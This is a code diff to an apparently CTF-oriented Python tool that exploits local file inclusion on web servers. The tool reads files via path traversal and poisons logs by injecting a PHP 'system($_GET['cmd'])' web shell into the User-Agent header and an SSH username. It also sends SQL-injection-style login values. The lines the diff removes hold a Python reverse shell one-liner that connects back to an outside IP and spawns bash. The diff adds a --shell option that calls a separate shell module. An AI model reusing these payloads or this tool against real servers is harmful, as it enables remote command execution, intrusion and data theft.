@@ -15,7 +15,7 @@ from Package.one_read import Read_File
 #ssh '<?php system($_GET['cmd']); ?>'@192.168.1.136
 
 path = ('file://'+os.getcwd()+'/FileStore/').replace('\\n','')    
-class Local_File_In :
+class Local_File_In():
 
         def __init__(self):
             
@@ -66,11 +66,9 @@ class Local_File_In :
                 self.Login_auth()
                 self.file_name()
                 self.url_request()
-                self.Reverse_shell()
             elif not self.args.auth and self.args.Vulnurl\
             and not self.args.password and not self.args.user and self.args.Cookie :
                 self.url_request()                
-                self.Reverse_shell()
             else:
                 print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                 print("[*] Error :  Bad argument Logic command  Error" )
@@ -134,7 +132,10 @@ class Local_File_In :
                    print("[*] Follow url Format ")
                    print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                    print("[*] Example : http://10.10.10.193:4000/page=index.php")
-                   exit()    
+                   exit() 
+            except KeyboardInterrupt :
+                   exit()
+          
         def url_request(self): 
               
             self.ip_re = re.search('(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|\
@@ -182,7 +183,7 @@ class Local_File_In :
                     request.set_handle_robots(False)
                     request.set_handle_redirect(True)
                     request.set_handle_refresh(True, max_time=1)              
-                    request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
+                    request.addheaders = [('User-agent', 'Mozilla/5.0<?php echo system($_GET["cmd"]); ?> (X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                  Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                  ('Cookie',str(self.Cookie).replace('\n','')),
                                  ('username',"admin'#"),
@@ -240,7 +241,8 @@ class Local_File_In :
                          print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
                          print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''))
                          print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
-                          +self.args.read.replace('/','',1).replace('/','_').replace('\n',''))         
+                          +self.args.read.replace('/','',1).replace('/','_').replace('\n',''))
+                         self.Reverse_shell()        
                          exit()
                     elif not self.args.auth and len(self.Get_Oregnal_URL) != len(first_req) :
                          self.file_name()
@@ -250,38 +252,28 @@ class Local_File_In :
                          print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
                          print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''))
                          print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
-                          +self.args.read.replace('/','',1).replace('/','_').replace('\n',''))                  
+                          +self.args.read.replace('/','',1).replace('/','_').replace('\n',''))   
+                         self.Reverse_shell()               
                          exit()
                 print('\n'+'='*20+"\n[*] RESUITE-INFO "+'\n'+'='*30+'\n')
                 print("[*] No Data found")
                 print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                 print("[*] try to use Defrant LFI wordlist ")
                 if not self.args.base64:
-                  print("[*] try to use PHP Filter bu useing -B64/--base64 ")  
+                   print("[*] try to use PHP Filter bu useing -B64/--base64 ")  
                 exit()                   
         def Reverse_shell(self):
-                 if 'log' in self.url :
-                    order2 = '''ssh '<?php system($_GET['cmd']); ?>'@192.168.56.107'''
-                    command_proc2 = ' gnome-terminal  -e ' +'"' + order2 +'"'               
-                    call_termminal = subprocess.call(command_proc2,shell=True,stderr=subprocess.PIPE)
-                    time.sleep(10)
-                    command ="""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.195.100.150",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
-                    fake_link = self.url.replace('\n','')+"&cmd="+command.replace('\n','')
-                    print(fake_link)
-                    request = mechanize.Browser()
-                    request.set_handle_robots(False)
-                    request.set_handle_redirect(True)
-                    request.set_handle_refresh(True, max_time=1)
-                    if self.args.Cookie:
-                       with open(self.args.Cookie,'r') as Cookie_file :
-                           Cookie =  Cookie_file.read() 
-                           request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
-                                             Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                            ('Cookie',str(Cookie).replace('\n','')),
-                                            ('username',"admin'#"),
-                                            ('password','password')]
-                    feka_log = request.open(fake_link).read() 
-                    print(feka_log )
+                 if not self.args.shell:
+                    exit()
+                 else:   
+                   try:
+                 #   path   =  "python " +str(os.getcwd())+'/Package/shell/ssh.py'
+                  #   os.system(path)
+                     from Package.LFT_Shell_connect import Shell_conncet
+                     Shell_conncet.__init__(self)
+                     
+                   except KeyboardInterrupt :
+                      exit()
         def file_name (self):
            removel  = ['..%2F','../','....//','file:///']
            self.url_remove = self.url.replace('http://','').replace('https://','')
@@ -289,8 +281,7 @@ class Local_File_In :
                  if i in self.url_remove :
                     join = ";".join(self.url_remove.split(i[-1]))
                     split_list = join.split(';')
-                    self.args.read= str("/".join((split_list[-3],split_list[-2],split_list[-1]))).replace('%2','/').replace('//','/').replace('\n','')          
-                            
+                    self.args.read= str("/".join((split_list[-3],split_list[-2],split_list[-1]))).replace('%2','/').replace('//','/').replace('\n','')                  
         def control(self): 
            parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]") 
            parser.add_argument("-UV ","--Vulnurl"     , action=None         ,required=True     ) 
@@ -304,6 +295,7 @@ class Local_File_In :
            parser.add_argument("-P  ","--password"    , action=None                            )   
            parser.add_argument("-LU  ","--loginurl"   , action=None                            ) 
            parser.add_argument("-U  ","--user"        , action=None                            )
+           parser.add_argument( "-S", "--shell"       , action=None                            )
            self.args = parser.parse_args()     
            if len(sys.argv)!=1 :
               pass
